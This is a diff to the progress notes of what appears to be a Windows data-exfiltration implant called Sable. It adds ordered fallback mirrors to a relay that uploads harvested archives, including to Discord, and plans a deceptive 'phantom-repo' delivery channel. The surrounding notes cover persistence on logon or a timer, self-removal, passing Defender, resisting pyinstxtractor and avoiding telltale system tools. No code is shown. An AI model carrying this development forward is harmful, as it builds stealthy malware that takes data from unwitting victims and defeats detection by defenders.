@@ -199,9 +199,17 @@ Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.
   straight into the stack, so a 660px-tall window squeezed a 40px edit into 18px and the
   validation message landed on top of the field below it. Rendered at 1280x820 and at
   1000x660 in both themes: no clipping, no overlap, the scrollbar appears instead.
-  `sable_window.py` still passes **29/29** and `sable_ui.py` **35/35** against the new
+  `sable_window.py` still passes **38/38** and `sable_ui.py` **35/35** against the new
   widget tree, including the rule that every `#selector` in `dark.qss` exists on screen
   and that `light.qss` defines the same set.
+- **Fallbacks, ordered.** A relay config now carries up to four mirrors behind the primary,
+  tried in the order the page shows them, with the first acceptance ending the delivery.
+  `agent.relay.deliver` is the multi-target entry point and `transmit` still means the
+  primary; both share `_send`, so one retry policy serves both and a permanent refusal is
+  permanent on either. `RelayPage` gained a Fallbacks card with add and remove rows, and
+  `sable_window.py` covers it: a blank row is not a target, a filled row joins the list, a
+  duplicate of the primary closes the gate and paints its own row, and a removed row leaves
+  the list. `pytest` is **256 passed**, `ruff` clean.
 
 ---
 
@@ -351,6 +359,12 @@ The delivery path is closed: queue, retry, encryption, streaming, Discord, local
 The lifecycle is closed too: one run, self-remove, or stay and come back on logon or a
 timer. What is left, in order:
 
+0. V2, multi-delivery, is the pass in progress. Ordered fallbacks are built: schema,
+   validator, relay and the Relay page all carry up to four mirrors behind the primary,
+   with `sable_window.py` covering the row behaviour. Still to come in this pass is the
+   rebuilt phantom-repo channel — a delivery route whose repository never holds the
+   archive it advertises — designed inside `agent/relay.py` so the manifest stays at
+   fifty paths.
 1. A host that has never seen the artifact. The operator's own Defender run passed, but his
    machine had history; a throwaway VM is the only way to see a cloud with no memory of the
    image. Still the last behavioural check, not a known failure.
@@ -361,7 +375,8 @@ timer. What is left, in order:
    from every artifact and makes the reader immune to `pyinstxtractor`; the second keeps one
    build pipeline. Everything else is ported only after that choice.
 3. Smaller items, none blocking: the 426 MB run took 6 minutes against a single-threaded
-   local receiver, so the real ceiling is unmeasured; per-source timing is not logged.
+   local receiver, so the real ceiling is unmeasured; per-source timing is logged but the
+   ceiling is not.
 
 Streaming is now the default: `relay._Body` reads the archive off disk in 1 MB blocks
 straight into the socket, so the upload no longer doubles the largest object in the
@@ -378,7 +393,7 @@ each source returns int, 0 when its artifact source absent   proven in the sourc
 missing mutex raises ConfigError; unknown key raises it      proven by tests/test_config.py
 no wmic / tasklist / getmac / reg / pywin32 anywhere         proven by grep, zero hits
 import-direction test passes                                 proven by AST in tests/test_imports.py
-UI builds; empty endpoint blocks Run; theme switch re-applies proven by the window harness, 29 checks
+UI builds; empty endpoint blocks Run; theme switch re-applies proven by the window harness, 38 checks
 no bare excepts                                              proven by ruff E722, zero hits
 ```
 
